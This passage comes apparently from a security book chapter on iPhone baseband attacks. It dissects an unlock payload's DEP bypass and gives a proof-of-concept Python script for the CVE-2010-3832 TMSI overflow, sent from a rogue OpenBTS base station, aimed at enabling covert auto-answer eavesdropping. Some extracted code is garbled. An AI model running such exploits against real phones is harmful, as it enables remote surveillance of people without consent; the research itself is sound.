0xFFFF050C LDR R1, =0x6018136C
0xFFFF050E BLX R1 ; call restore_cpsr
0xFFFF0510 SUBS R0, R1, R1
0xFFFF0512 MOV R2, SP
0xFFFF0514 LDR R2, [R2]
cc1111..iinndddd 335522 44//1166//22001122 55::4488::1199 PPMM
Chapter 11 n Baseband Attacks 353
0xFFFF0516 BX R2
0xFFFF0516 ; -------------------------------------------------------------------
0xFFFF0518 dword_FFFF0518 DCD 0x60FA011F ; DATA XREF: decoder_entry
0xFFFF051C dword_FFFF051C DCD 0x60701280 ; DATA XREF: 0xFFFF04DE
0xFFFF0520 P_disable_ints DCD 0x6018135C ; DATA XREF: 0xFFFF04E4
0xFFFF0524 P_restore_cpsr DCD 0x6018136C ; DATA XREF: 0xFFFF050C
Since there was a routine of the ThreadX OS living at the address overwrit-
ten by the previous code, the fi rst instruction is a simple detour to a version of
the overwritten function in fl ash. The code starting at 0xFFFF04D8 is a simple
decoding function that is used by subsequent at+xapp overfl ow instantiations
to allow for arbitrary payloads; this simple decoder is required if you want to
inject binary blobs, as certain bytes such as whitespaces and the zero byte are
not allowed to appear in the string passed to at+xapp. The decoder uses r5+r6 as
a destination address for the decoded payload and r4+r7 as the source address
for the input of the decoder. It works by copying bytes until it hits a quotes
character (0x22), regarding 0xff as an escape symbol. If 0xff is found in the
input, the byte following it is incremented by one (modulo 256) and copied to
the output — with the escape symbol discarded.
This approach raises two questions: Why is a ROP chain needed to inject
the decoder and what is so special about the memory space the stager and the
decoder were copied to?
The X-Gold 61x introduced a new security feature, namely a strict form of
Data Execution Prevention (DEP). All memory regions that are writable lack
the execute fl ag. Furthermore, memory is marked as executable in the early
initialization phase, and after this phase the page permissions are locked.
There seems to be no way to ever set an execute fl ag on a writable page after
this initialization phase is completed.
On the other hand, you can see native rather than just ROP chains code in
the preceding payload. How does that work? It turns out that the DEP armor
has a signifi cant chink. ARM CPUs can have fi rst level caches, which are called
tightly coupled memory (TCM). The ARM1176 core in the X-Gold 61x has a TCM
that it is enabled during initialization:
0x40100054 MOV R0, #0 ; TCM bank 0
0x40100058 MCR p15, 0, R0,c9,c2, 0 ; write TCM selection register
0x4010005C NOP
0x40100060 MOV R0, #1 ; “1 = I/D TCM Region Register accessible in
; Secure and Non-secure worlds.”
0x40100064 MCR p15, 0, R0,c9,c1, 2 ; write DTCM non-secure control access
; register
0x40100068 NOP
0x4010006C MCR p15, 0, R0,c9,c1, 3 ; write ITCM non-secure control access
; register
0x40100070 NOP
0x40100074 LDR R1, =0xFFFF000D ; enable ITCM with base address 0xFFFF0000
cc1111..iinndddd 335533 44//1166//22001122 55::4488::1199 PPMM
354 Chapter 11 n Baseband Attacks
0x40100078 MCR p15, 0, R1,c9,c1, 1 ; write ITCM region register
0x4010007C NOP
0x40100080 LDR R1, =0xFFFF200D ; enable DTCM with base address 0xFFFF2000
0x40100084 MCR p15, 0, R1,c9,c1, 0 ; write DTCM region register
0x40100088 NOP
0x40100088 ==========================
0x4010008C MOV R0, #1 ; TCM bank 1
0x40100090 MCR p15, 0, R0,c9,c2, 0 ; write TCM selection register
0x40100094 NOP
0x40100098 MOV R0, #1 ; “1 = I/D TCM Region Register accessible in
; Secure and Non-secure worlds.”
0x4010009C MCR p15, 0, R0,c9,c1, 2 ; write DTCM non-secure control access
register
0x401000A0 NOP
0x401000A4 MCR p15, 0, R0,c9,c1, 3 ; write ITCM non-secure control access
register
0x401000A8 NOP
0x401000AC LDR R1, =0xFFFF100D
0x401000B0 MCR p15, 0, R1,c9,c1, 1 ; write ITCM region register
0x401000B4 NOP
0x401000B8 LDR R1, =0xFFFF300D
0x401000BC MCR p15, 0, R1,c9,c1, 0 ; write DTCM region register
0x401000C0 NOP
0x401000C4 BX LR
This explains why the exploit could write to addresses above 0xFFFF0000
and have the CPU execute the written data as code.
To make sense of the second and third at+xapp strings being sent, you fi rst
have to understand the last one. We will not give the payload contained in the
last unlock string in its entirety, but rather only have a quick look at the meat of it:
0xFFFF0A30 LDR R4, =0x601FD9FC ; memcpy
0xFFFF0A32 LDR R5, =0x60FA0000 ; void *ptr = 0x60FA0000
0xFFFF0A34 LDR R6, =0xFFFF1000
0xFFFF0A36
0xFFFF0A36 tcm_patch_loop ; CODE XREF: sub_FFFF09A8+A2
0xFFFF0A36 LDRH R0, [R5] ; dst_offset = *((uint16_t *) ptr)
0xFFFF0A38 LDRH R2, [R5,#2] ; len = *((uint16_t *) ptr + 2)
0xFFFF0A3A MOVS R7, R2
0xFFFF0A3C CMP R2, #0 ; if (len == 0)
0xFFFF0A3E BEQ tcm_pl_exit ; { goto tcm_pl_exit; }
0xFFFF0A40 ADDS R5, #4 ; ptr += 4
0xFFFF0A42 MOVS R1, R5
0xFFFF0A44 ADDS R0, R0, R6 ; dst = 0xFFFF1000 + dst_offset
0xFFFF0A46 BLX R4 ; memcpy(0xFFFF1000 + dst_offset,
; ptr, len)
0xFFFF0A48 ADDS R5, R5, R7 ; ptr += len
0xFFFF0A4A B tcm_patch_loop
0xFFFF0A4C ; --------------------------------------------------------
0xFFFF0A4C
0xFFFF0A4C tcm_pl_exit ; CODE XREF: sub_FFFF09A8+96
cc1111..iinndddd 335544 44//1166//22001122 55::4488::2200 PPMM
Chapter 11 n Baseband Attacks 355
0xFFFF0A4C LDR R0, =0xFFFF0F78
0xFFFF0A4E ADR R1, sub_FFFF0B54
0xFFFF0A50 MOVS R2, #0xC
0xFFFF0A52 BLX R4
0xFFFF0A54 BL sub_FFFF0A74
0xFFFF0A58 POP {R4-R7}
0xFFFF0A5A MOVS R0, #0
0xFFFF0A5C LDR R3, =0x60186E5D ; stack_cleanup (SP+=0x1C)
0xFFFF0A5E BX R3
The second and third at+xapp strings store a list of memory regions in the TCM
to patch in memory at address 0x60FA0000. This list is traversed by the previous
code and has a simple format: Each entry of the list has a header consisting of
a 16-bit offset fi eld relative to 0xFFFF1000 and a 16-bit length fi eld specifying
its length without header. The list is terminated with an entry that has zero in
the length fi eld. The following IDAPython script emulates the behavior of the
previous native code.
from idc import *
ea = 0x60FA0000
dst = 0xFFFF1000
while True:
n = Word(ea+2)
offset = Word(ea)
if n == 0:
break
print “patching %d bytes at 0x%08x.” % (n, dst + offset)
ea += 4
for i in range(n):
PatchByte(dst+offset+i, Byte(ea+i))
SetColor(dst+offset+i, CIC_ITEM, 0xFFFF00)
ea += n
Use the Load Additional Binary File function to load the decoded, concat-
enated payload of unlock strings two and three to address 0x60FA0000 into an
existing IDA Pro database of the stack, then run the preceding script.
Another interesting facet of the payload contained in the last unlock string
are the following two functions, for which we give their C representations:
/* 0xFFFF0AB2 */
int replace_addrs_on_stack(uint32_t *start, uint32_t *end, uint32_t match20msb,
uint32_t replace_base)
{
while ( start > 12 == match20msb >> 12 )
*start = (*start & 0xFFF) + replace_base;
++start;
cc1111..iinndddd 335555 44//1166//22001122 55::4488::2200 PPMM
356 Chapter 11 n Baseband Attacks
}
}
/* 0xFFFF07AE */
void replace_addrs_on_all_stacks(void *match20msb, void *replace_base) {
thread_ptr = tx_thread_created_ptr; /* [R4] */
/* i is stored in [SP]
* tx_thread_created_count is in R7
* thread_ptr is in R4
*/
for(i = 0; i tx_thread_stack_start,
thread_ptr->tx_thread_stack_end,
match20msb, replace_base)
thread_ptr = thread_ptr->next;
}
}
The replace_addrs_on_all_stacks function is used to correct the addresses
of all return addresses on the stacks of all threads. Every return address pointing
into the TCM is rewritten to an address in fl ash memory; these are the memory
locations from which the code copied by the scatter-loader into the TCM originates.
The lessons you learned from ultrasn0w will be of great advantage if you
choose to develop a remote exploit for the iPhone4.
An Overfl ow Exploitable Over the Air
This section analyzes the CVE-2010-3832 vulnerability and gives a proof-of-
concept exploit for it. This vulnerability results from a memory corruption of a
buffer due to a missing boundary check on the length of the TMSI in LOCATION
UPDATING REQUESTs and TMSI REALLOCATION COMMANDs — functionalities related
to Mobility Management. It affects all iOS devices’ cellular service running
versions prior to iOS 4.2. No interaction with the device is required from the
user; the device simply has to come into the range of a malicious base station
wishing to exploit this vulnerability.
Here we show you how to trigger this vulnerability and how to leverage the
heap corruption to gain control over the program counter. We then show you
how to turn on the auto-answer functionality of the iPhone by executing the
handler for setting the S0 register. This allows an attacker to turn an iPhone
into a remote listening device.
We investigate this bug on an iPhone 2G running iOS 3.1.3 with baseband
fi rmware ICE 04.05.04_G. The description here is the story that was recovered
from scattered notes on how the bug was originally found and exploited,
modulo some boring dead ends that were removed. We have chosen the
iPhone 2G over the more recent iPhone 4 for two reasons: First, because
cc1111..iinndddd 335566 44//1166//22001122 55::4488::2200 PPMM
Chapter 11 n Baseband Attacks 357
the codebase of the iPhone 2G is much smaller and hence a clean IDB can be
obtained much more quickly than for the iPhone 4. Second, for the iPhone
4, this bug has been patched and no known ways exist to downgrade the
baseband fi rmware to a vulnerable version. Contrast this to the case of the
iPhone 2G where fi rmware is completely malleable due to implementation
failures in the security checks performed by the bootloader. This means that
you can buy any old second-hand iPhone 2G and get your hands dirty in
baseband hacking with a publicly known vulnerability; no fear that you’ve
bought a version with the wrong baseband fi rmware revision, and no lost
time and money due to accidental upgrades.
A TMSI REALLOCATION COMMAND with the length of the TMSI extended to 64
bytes neatly triggers the bug. Figure 11.3 shows a GSM layer 3 message contain-
ing a TMSI REALLOCATION COMMAND that triggers the bug, displayed via
the Wireshark network analyzer.
Figure 11.3: Malicious TMSI REALLOCATION COMMAND dissected with Wireshark
NOTE TMSIs smaller than 64 bytes do not cause a crash, at least on the
iPhone 2G.
Unfortunately, the message cannot be directly created with an unmodifi ed
version of libmich. As with standards-compliant implementations of the GSM
cc1111..iinndddd 335577 44//1166//22001122 55::4488::2200 PPMM
358 Chapter 11 n Baseband Attacks
and 3GPP protocols there is no reason to support TMSIs have a length different
from four bytes. However, you can easily use libmich to create an appropriate
message and modify the TMSI fi eld and length.
First start up OpenBTS, register the iPhone with your network, and initiate
a UDP channel for exchanging GSM layer 3 packets with the handset by using
the testcall facility of OpenBTS:
OpenBTS> tmsis
TMSI IMSI IMEI(SV) age used
0x4f5e0ccc 262XXXXXXXXXXXX 01XXXXXXXXXXXXXX 293s 293s
1 TMSIs in table
OpenBTS> testcall 262XXXXXXXXXXXX 60
OpenBTS> calls
1804289383 TI=(1,0) IMSI=262XXXXXXXXXXXX Test from=0 Q.931State=active SIPState=
Null (2 sec)
1 transactions in table
You then send this payload using the following small Python script:
#!/usr/bin/python
import socket
import time
import binascii
from libmich.formats import *
TESTCALL_PORT = 28670
len = 19
lai = 42
hexstr = “051a00f110”
hexstr += “%02x%02x%02xfc” % (lai>>8, lai&255, (4*len+1))
hexstr += ‘’.join(‘%02x666666’ % (4*i) for i in range(len))
print “layer3 message to be sent:”, hexstr
l3msg = binascii.unhexlify(hexstr)
print “libmich interprets this as: “, repr(L3Mobile.parse_L3(l3msg))
tcsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
tcsock.settimeout(1)
try:
tcsock.sendto(l3msg, (‘127.0.0.1’, TESTCALL_PORT))
reply = tcsock.recv(1024)
print “reply received: “, repr(L3Mobile.parse_L3(reply))
except socket.timeout:
print “no reply received. potential crash?”
Shortly after executing that script, you lose your signal (the baseband pro-
cessor resets). The result is a crash log similar to the following on the iPhone,
which you can extract using AT+XLOG:
cc1111..iinndddd 335588 44//1166//22001122 55::4488::2200 PPMM
Chapter 11 n Baseband Attacks 359
+XLOG: Exception Number: 1
Trap Class: 0xAAAA (HW DATAABORT TRAP)
System Stack:
0x6666661C
0x66666630
0x66666644
0xA027CBFC
0xA027CCE4
0x6666665C
0x0000000A
0x6666665C
[...]
Date: 14.07.2010
Time: 04:58
Register:
r0: 0xA027CBFC r1: 0xA027CCE4 r2: 0x6666665C
r3: 0x0000000A r4: 0x6666665C r5: 0xA027CCE4
r6: 0x00000001 r7: 0xB0016AA4 r8: 0x00000000
r9: 0xA00028E4 r10: 0xB008E730 r11: 0xB008FE9C
r12: 0x45564E54 r13: 0xB008FA8C r14: 0xA0072443
r15: 0xA0026818
SPSR: 0xA0000033 DFAR: 0x6666666C DFSR: 0x00000005
Take a peek at the code producing the preceding exception:
ROM:A002680A FF B5 PUSH {R0-R7,LR}
ROM:A002680C 0D 00 MOVS R5, R1
ROM:A002680E 83 B0 SUB SP, SP, #0xC
ROM:A0026810 10 69 LDR R0, [R2,#0x10]
; causes HW DATAABORT TRAP
ROM:A0026812 14 00 MOVS R4, R2
ROM:A0026814 0D 9A LDR R2, [SP,#0x30+arg_4]